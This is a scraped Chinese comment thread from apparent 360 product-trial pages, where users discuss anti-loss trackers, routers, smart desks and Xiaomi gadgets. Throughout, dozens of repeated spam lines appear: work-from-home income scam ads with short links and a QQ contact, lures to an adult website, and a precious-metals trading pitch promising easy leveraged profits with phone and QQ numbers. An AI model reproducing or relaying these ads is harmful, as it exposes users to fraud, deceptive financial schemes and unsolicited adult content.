360支持你！永远的保护！永远的实用好用！支持360 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
土豪专用。
好东西啊！就得好实用啊。外形又好看
评测不错啊
外观这么难看，还不能抢到？
360果然是个好卫士！电脑能帮我们管理好，生活也一样帮到了我们好多
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
淘宝看过类似的，普遍反应实际使用覆盖范围太小，有些设备经常连接不到。
这个创意很好啊！用这个办公效率是大大提高啊，不过面对现在的市场，估计也只有个别大公司能用上几张。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
有了这个不等于有了个随时随地的网络机顶盒啦
。。。。。。。
看到就心动了，如果有了一个，不就是羡慕死小伙伴的节奏啊
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
360研发的都很实用，期待中签ing··· 
希望可以中呀。非常喜欢喜欢这个了
写的很细致！
评测不错啊！
360你雖然不差錢,,你奶奶的別玩我們平民了????????????
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
好酷哦！我是个大头虾，老是不记得拿这拿那的，好用的话就好了。很期待
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
确实很细致！
确实有够无聊！
骗子，死开吧。····
我靠太好了 
你这是测评
概念很好，只是对于需要在桌子上画图和裁切东西的人来说，桌面材质需要很结实，还需要防水，不然水杯一洒，桌子就完蛋了。
360不错，好用！
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
免费试用还要回去吗？
第一评!!!
亲，我的中奖的360安全路由器到底被邮寄到何方了？？？
真的能防丢，真的太好了，一直都是用360的东西 
实用的360防丢卫士，支持360。
想买一个……
电脑上全套360了。
分析的很详细啊！
感觉很专业的样子啊！
1你是设置了U盘装系统的那个程序了。2软件冲突而已。
这个钱包能在薄一点儿就更好了！
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
很有眼光啊！
被你占先了！
好客气啊！
传说中的技术帝？
价格有些高了点呢。呵呵
......
喜欢这个。嘿嘿
这个确实是比较关心的问题！
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
真是期待啊！
怎么收回啊
希望可以中啊！~~~方便啊
360功能强大，支持。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
已申请，期待中。。。。。
地理位置定位功能，当然定位必须经过对方同意。
亲，来些图片吧~
既然是为了孩子的安全！首先超强待机能力是很重要的，显然两三天的待机时间远远不能满足安全需求！其次产品外观要有充分隐蔽性，保证在紧急情况下不离开孩子身体是至关重要的！一旦在意外状况下脱离身体，有没有备用保障功能的其他佩戴在身体上的更隐秘位置的其他附属装置可以保障手边丢失功能不丢失，将安全做到万无一失！最后就是产品的防水功能应该是不可缺少的，例如在雨天或者是涉水状态下可以保障功能的正常安全使用！
期待您的更新~
亲，拍些照片吧~
想去旅行，有这个东西估计挺方便，现在上市了吗？申请不到使用可以买的呀
我不知道啊
期待可以被选上，360加油。
继续完善，相信所有家长都希望360可以做得更好！
已申请，期待中。。。。。 
亲，可以来些图片哦~
360能让我中吗    创意很好的
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
期待中！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！!!!!!!!!!!!!!!!!!!!
期待申请成功
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
期待中，希望可以中选
不错，已购买
创意后果断购买 
360真是越做越好了
前面360发行过这个，用过后感觉不错。希望这次比以前好！！
期待，期待，没想到360有这么强大，希望它能成为世界3强！
非常令人期待 
真的很期待能够申请成功！
砍下排骨就废了·
希望申请成功，而且希望360越办越好
表示知道有点小期待啊，习惯丢三落四的，想要申请成功，之前的手机就粗心掉了。。期待~~~~~~~~~~~~~~~~~~~~~~~~~~~~表示想中~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
好看！确实指针手表看时间方便得多~
TMD，希望ipad能用
那真是极好了。。。
希望申请成功
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
申请成功的话就不怕手机总丢了。都已经丢了3部手机了！！！！！360求你了.......
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
买了一个，不知道是我手机的原因，还是   有时反应不快，造型不错
亲，可以设置到不用密码哦~~~
希望能申请成功，建议增加更丰富的功能
设置到可以输入密码也可以，设置到可以也不用密码。。。
路由器新一轮抢购开始了！
360  支持
申请成功的话就不怕手机总丢了。都已经丢了6部手
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
如果能中就太好了，不用担心丢东西了
我家的整个电脑都是360的！ 
360越来越强大了
很好很好很好好 
希望申请顺利～～～
太酷了  不知道什么时候  测评。。。。。
出门忘带包包、手机、钥匙是很麻烦的，360防丢卫士能帮我解决
希望可以拿到！ 
创意恨意   期待上市。。。。。
力挺  360！！！希望申请成功111
钥匙几乎常常忘记放哪里 有次居然全部钥匙创一起没了  门锁都一口气全部换掉 郁闷
感觉  不错  如果几十块钱的话  还是很容易接受的
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
老丢东西，手机也丢实在是受不了了！
可以用来打开手机屏幕吗
盾哥 跪求试用
希望可以拿到 
希望小米手环能对智能硬件可穿戴市场有一次促进和带动的作用。
已预约。就等开卖了。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
真棒 ！！！！我就需要这个
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
这个比较好，力顶！
话说这上面刻的“LUV”电码是要表达什么意思？
虽然是抄袭，但是也要入手评测一下。
希望可以采纳我的意见
360 让我看到了真正的科技公司
喜欢诶~希望快点出~
功能不错，支持点触？
希望能申领得到，很实用的东西！
今天发布了
我还是申请一下吧，对这个挺有兴趣的，好期待
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
360的地盘尽然有小米.
像我这种屌丝，是买不起了！！
我想要诶，可以打电话么肯定不能吧- -
真棒，360真好。。。 
经常出差，想能拿到
很实用，很好
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不会都被内部人员拿了吧
how much？
这个很实用的东东，很想得到并且试用。
希望拿到、、、、、、、、
不错的应用小东西
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
哇终于可以不用问 老妈我手机呢？  我钱包呢？  我钥匙呢？ 。。。。。。。- -！！期待已久希望赶快上市
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
大爱360~
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
好东西啊！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
www.geekboy.cn
爽东西啊 ...
................. 
360加油↖(^ω^)↗，好棒，给发一个。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
非常感兴趣，不知道你们的流程是什么？申请了好几次了，就是不给适用，呵呵！！！
有一点我不是很清楚，这个产品可以通过手机端控制摄像头旋转吗？
便宜点！！！！！
肯定可以。。
不要限量啊
好像有台，360我支持你，给我台可好
外形有待改进
喜欢 我想试用下是什么效果
 啊哈哈哈哈，一点进来就是各种淘宝，网上兼职广告，没有人管理的吗
啊哈哈哈哈，一点进来就是各种淘宝和网上兼职的广告，没有人管理吗
简直是帅呆了，这种高科技都是经常在美国大片里见到过。
好像很牛*的样子，可万一一激动把它拍碎了怎么办。
支持小米！！！！！！
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不错，要是来了电话的话，可以直接接通电话就更加方便。
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
照看宠物肯定足够了，最好可以用手机控制！
很好，很实用！
看简介功能不错，很想试用一下！！！
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
1999RMB
确实很有创意呀，可是这对人体伤害会不会相对大多了.....每天对着电脑就已经很受不了啦！加上桌子都这样子，还能熬多久....？
啊哈 这图都做的不错呢
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
给苹果系列也来个无线充电就好了
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
希望这个能有红外夜视啊
真漂亮 啊 酷我 喜欢我下面那个拥有啊 
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很酷！未来的一种趋势吧，迟早连显示屏都不用了，就像一些大片里描述的那样，直接在空中虚拟化一个显示屏。未来的智能化住宅智能化办公的一部分。现在嘛，只能属于高科技牛品，普通人仰望之。
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RP2hay1 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
小伙伴们都惊呆了
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～     想了解详情请加    qq  839290299
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
单天线的穿墙？嗯 很期待~
360的地盘有小米       叫一直敌对360的累不死情何以堪啊
酷啊，科技感超强
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
这个好                         在哪买
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。
太酷了，真想不到在360也可以预约小米了！
对比一加、荣耀6。米4没什么亮点吧？
方便，实用
旋转更灵活、角度更广阔那就更加完美了。
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
健康手环的功能：1、测量心率，2、测量温度，3、测量血压，4、通过手机观察，把这几个功能做上去就很好了。价格可以贵点。 
这么小的内存  256M只能放十来首歌，还是收藏吧
功能都差不多，但小米手环价格摆在那
不是window系统。。。。只能做特定的事，还是无法代替需要堆满日常用品和纸质文件的办公桌，放东西就会遮住屏幕，如果内存崩掉，东西全没了
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很好的创意。360，不简单。
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
贵金属投资，可双向交易，涨跌皆可盈利，22小时交易时间，入门简单，有无基础均可投资，电脑手机同时操作，方便快捷，比炒股更简单。资金无门槛，以小博大，小资金撬动大收益。免费开户，开户即送10万模拟资金操作，免费开户客服预约电话：13627807588，QQ：409910998
男士福利！女女勿进！直接复制进入《欢情楼pw》都懂的
喜欢 我想试用下是什么效果 
漂亮 ！还可以
求中奖求中奖 ！！！！！！
已申请，期待中
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
期待中。。。看看专业不.哈哈
希望能够满足大众的需求，加油加油！
希望能满足大众的需求，更好的实用，加油
经常不在家，喜欢这种产品，迫切想试用一下，好期待
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
求中奖求中奖 ！！！！！！！！！！！！！！！！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
不限制工作时间，做的越多挣的越多（宝妈、学生、上班族都可以）～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
经常不在家，喜欢这种产品，迫切想试用一下，好期待 
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
赞 咱力顶360
第一次写测评，略显生疏，不足之处请多包涵，会继续坚持努力，逐渐完善做到更好。
这就是个光买外形的东西啊  很漂亮
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
上次写了那么多，也没中。这次不知道能不能中!
360给我方便，立挺
没说的.................
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
不错，很好
丢不掉的就是想甩都甩不掉的还是好的吗？太占用空间了，电脑都挤压得跑不动了。
谔谔，，，，
你电脑配置太差，如果重装一下会好些！
期待...
实际使用 操作复杂 效果也不理想 硬件配置太弱 延迟明显 提升硬件又意味着价格上升 而且最好使用5G频段的设备才能保证体验 这个又进一步提高了这个设备的门槛 总的来说 还不成熟
信360 能中奖！
这个东西有创意，一定会大卖
同意 88888
很有科技感哦，不知道能否实现
当真很漂亮啊。真心喜欢。
出了，9百多元
小米现在不行了
要是移动版的现在有我就卖一个 就是不知道到时候，我卖别的手机了没。。。
这儿也能预约小米了？？？什么情况
该桌面用途应先从专业领域发展，基于OSX强大的编辑能力。我觉得这个“桌子”用于3D建模会比普通民用市场来的更巨大
小米真是越来越强大了
如果有电动版的就好了。
只能说比较鸡肋，建议以贴膜形式并入显示屏系统，让手机在特定模式下运行电子墨水
iPhone能用就好了
控制手段太过单一，完全限制于运营商。不建议以微信平台作为控制手段，高大上的作品对功能上的优化太弱了
又是一个高大上但是鸡肋的设计，产品壁垒较低，可复制性太强。建议提高集成度
设计所谓的外设完全是想掩盖，自身UI的不足。不好好设计程序，卖外设的行为不可取
安逸，期待那天电动车也能无线充电。
上班带步安逸哦，搞一个四轮折叠的更安逸。
个人认为搞一个座位，这样更适合代步。
希望这次能成功！！！
有了360，以后贼会越来越少了
在线演示远程监控
你想得有点多 明显现在不带这个功能
开52个口能显示时间就更好了
有没有跨地区的啊 一个人要找另外一个,可不认识路 用那东西帮忙手机地图定位搜索路线 所谓的防丢不是单纯意义的 近距离好不好 这功能也太单一了
我相信能实现，只不过是时间的问题。社会的进步就是走向智能化
字被你吃啦，快放出来啊
这个智能键能不能用作手机收听收音机的天线呢？
让想象更真实
希望有用  希望能中  期待  期待  期待。。。。。。
哈哈，小米给力
希望能成功申请到免费试用
这应该是2001年在北京市场上出现过的防丢器的变异产品，当时防丢器分为子母机，母机挂在大人身上子机放在小孩身上或重要物品上，待两者超出一定范围母机就会报警。当时本人代理经销过，当时该产品弊端太多，报警声音小，闹市根本听不到。灵敏度差，有事没事响一下。纽扣电池不耐用更不好买到，即使找到也要好几十元一粒，我这里是县城。希望新产品能克服以上弊端，真正的有益于社会
希望能成功申请到免费试用 !
好呀，功能齐全，外观不像金属的上档次，在接打电话时能否解决接听方便音量清晰，动作协调的问题，最后就是质量一定要敢比拼苹果，三星。盼中国民族好产品，严把质量关！
希望早日出炉
我有一个，多好?
我保证，360防丢卫士一上市场就会大卖！！这款产品想法真是天马行空，可谓前无古人，后无来者！
很有创意的设计师  期待
哇，越来越来越有创意了！真爱！哈哈。360真赞，希望这次可以使用成功。
还是花鼓直接发电靠谱。
苹果手机不能用 开发团队大神努努力呀
这不是I粪6吗？？？
让防丢少发生，希望能试用，体验
很好的设计，值得期待！
很漂亮啊。真心喜欢。
正常人会写这种体验报告？蒙谁呢？坑谁呢？
这个功能很好，带小孩也可以用
很漂亮啊。真心喜欢。
我保证，360防丢卫士一上市场就会大卖！！这款产品想法真是天马行空，可谓前无古人，后无来者！ 
这应该是2001年在北京市场上出现过的防丢器的变异产品，当时防丢器分为子母机，母机挂在大人身上子机放在小孩身上或重要物品上，待两者超出一定范围母机就会报警。当时本人代理经销过，当时该产品弊端太多，报警声音小，闹市根本听不到。灵敏度差，有事没事响一下。纽扣电池不耐用更不好买到，即使找到也要好几十元一粒，我这里是县城。希望新产品能克服以上弊端，真正的有益于社会 
有了360，以后贼会越来越少了 
聪明人值得敬佩
这个很棒 需要
很好的创意，可蓝牙一直开着会不会对身体不好啊
尽量吧产品做微型化 
小米果然很强大，永远支持小米！！！！！！！
请关注ACTON微信公众号咨询预购信息：ACTONinc
期待，360总是能先人一步做出实用的科技工具~
谢谢哦~~~记得关注我们微信公众号ACTONinc
更全面的参数请关注我们微信公众号ACTONinc
靠，什么时候可以开买~ 
现在可以通过美国Kickstarter众筹网站预购哦~
现在可以通过美国众筹网站Kickstarter预购哦，价格比将来市场零售价优惠很多。中国还没正式上市哈
真心不错，，，
需要一点点时间适应平衡，习惯之后没问题哈
一直在使用360,360总有心创意！
溜冰鞋你得脱了鞋子再穿进去，这个不需要哈
是滴谢谢~~ 欢迎关注我们官方微信公众号 ACTONinc
你就是煞笔
不会是要到付吧,没有说明哦....
希望能成功申请到免费试用
有兴趣的亲现在可以来Kickstarter预购，全球都可以寄送。中国暂时还没上市，更多信息请关注ACTON微信公众号： ACTONinc
可以来Kickstarter预购哦，https://www.kickstarter.com/projects/petertreadway/acton-r-rocketskates-worlds-first-smart-wearable-m?ref=nav_search   也可关注我们微信公众号：ACTONinc
价格会稍微高一点点哈~
亲预购联系我们微信公众号哈：ACTONinc
怎么连接啊，
wifi连接？
老是不给试用的，真不知道怎么回事。再不给画个圈圈诅咒你们，产品一个都卖不掉，网站直接倒闭。
想必是个好东西！
这个设备虽然抛出来的东西比较的光滑但是对原始的产品尺寸却有了很大的改变。
这个很棒 需要 
节省空间啊，又是一个好宝贝
  看着挺好用    不知道我们用这好不好
别放弃治疗，你已经连最基本的交流方式都驾驭不了了，晚期就是植物人
必须得支持
希望能成功申请到免费试用
小孩不回家时，能通过手机找到她的位置就更好。
还有就是很浪费流量的，手机耗电量也会迅速增加。
非常期待呢
希望早日出炉 ,功能齐全，外观不像金属的上档次，在接打电话时能否解决接听方便音量清晰，动作协调的问题
移动的流量费太贵了，还是联通的便宜，信号也还可以！
好东西啊，很实用，前景一定广阔。
真是再实用不过的东西了，对于爱丢一族来说是太贴心了。
实在是太好了，大家可以试试
小米就指望你造汽车了
社会走向智能化，科技化是世界潮流，浩浩荡荡，谁也阻挡不了，只能主动或被动的卷入其中！
不知道有没有机会争取到免费试用啊
按键经常失灵望改进
上面写着了，是自己有内置电池的，不会用手机电池，手机电池仅仅是蓝牙的功耗，而且不开屏幕，相当于将这个东西作为手机的黑白屏幕，因为手机屏幕占非电量的70%以上，所以这个屏幕对手机的续航能力有很大提升，因为画面是单像素的，所以用电也不会很多
大概售价打算多少 
老夫来了.......
希望运气好能得一个哈~~
给我老婆一个吧
应该把显示屏清楚度设计的更清楚点！估计应该很贵的，应该上千了吧！呵呵
咱不知实用性
感谢360的各位老师的辛勤努力
希望能成功申请到免费试用 
我想要的，360都想到了
VIVO 的手机比小米强！
360太贴心了，总是能出一些新奇好用的产品。感谢先。
哈哈，看看我的运气好不好，从2005年就已知用360，感觉很好，支持360.。。
功能太多，耗电量应该好大
额，有这个功能，支持360，我顶，
期待360出更多实用性强的科技产品。
好东西，360电脑上必不可少。
小米，加油啊，我同意 兄弟sk 小米就指望你造汽车了  的，造汽车吧，谢谢
希望可以申请到，360用了不知道多少年了。
你的反话讲的很好，奖励试用猪翔一坨。（相信360！支持360！）
只能小米手机用吗
希望能成功申请到免费试用
如果贴在车上，不知如何，呵呵哈哈 ╮(╯▽╰)╭
真心动，价格多少？
中奖吧，免费试用中
怎么供电呢？
希望运气好些    给我把
没用的产品…哥不好平论
希望能得到这个。。。
希望能成功申请到免费试用
360超级棒！希望能成功申请到～～
丢三落四的人有救了 哈哈
